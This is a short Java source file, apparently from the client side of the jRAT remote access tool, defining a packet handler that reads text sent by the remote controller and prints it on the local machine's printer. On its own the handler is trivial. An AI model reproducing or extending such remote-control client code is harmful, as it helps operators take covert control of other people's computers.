package jrat.client.packets.incoming;

import jrat.client.Connection;
import javax.swing.JTextPane;


public class Packet69Print extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String toprint = con.readLine();
		JTextPane c = new JTextPane();
		c.setText(toprint);
		c.print();
	}

}
